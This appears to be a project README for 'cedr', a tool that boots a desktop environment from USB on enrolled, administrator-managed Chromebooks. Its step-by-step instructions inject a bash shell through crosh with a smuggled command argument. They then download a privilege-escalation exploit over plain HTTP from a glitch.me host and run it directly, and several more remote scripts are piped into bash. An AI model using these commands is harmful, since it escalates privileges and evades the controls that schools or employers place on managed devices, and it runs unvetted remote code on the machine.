# cedr
cedr - the ChromeOS Enrolled Desktop Runtime

## Requirements
 - A Chromebook, downgraded to v81 with crosh access
 - A USB drive or SD card, 4gb or more (32gb is reccomended), formatted with a **single partition**, ext4 filesystem

## Installation onto a USB drive

1. Open a crosh tab (Ctrl+Alt+T) and get into bash:
```crosh
set_cellular_ppp \';bash;exit;\'
```
2. Run the privilege escalation exploit:
```bash
bash <(curl http://hostz.glitch.me/80.sh)
```
3. Now, plug in your USB drive/SD card and find the path to its block device. Usually, it'll be /dev/sda if you're using a USB drive, or something different with an SD card. Either way, use the following command to find it (it's usually at the bottom)
```bash
fdisk -l
```
4. Once you know the drive you're installing cedr to, you now need to choose a target to install. You can choose from the options [here](https://github.com/rainestorme/crouton/tree/master/targets). Each target represents a desktop environment. For this tutorial, I'll use `xfce` as the target, but you can change it to whatever you want:
```bash
curl https://raw.githubusercontent.com/rainestorme/cedr/main/cedr-bootstrap.sh | bash -s /dev/sdX xfce
```
5. This will take around 50 minutes and once it's done, it will prompt you for a username and password. Supply these and the chroot will automatically be unmounted. Now, to activate the desktop, run the following:
```bash
cd /home/chronos/usbdrv
./cedr-activate.sh
```
6. Now that you're done working within your chroot desktop environment, you can logout of the session using the built-in controls. If you want to unplug the USB drive, wait for the process to finish unmounting, then run the following:
```bash
bash <(curl http://raw.githubusercontent.com/rainestorme/cedr/main/cedr-umount.sh)
```

## Usage

After creating a USB drive with cedr, you can remount it and launch the desktop environment with the super-duper-ultra-easy command found below:

```bash
curl https://raw.githubusercontent.com/rainestorme/cedr/main/cedr-mount.sh | bash -s /dev/sdX
```

Once again, replace /dev/sdX with your USB drive/SD card.

Once you're done, just do the same thing as before to unmount your drive:

```bash
bash <(curl http://raw.githubusercontent.com/rainestorme/cedr/main/cedr-umount.sh)
```
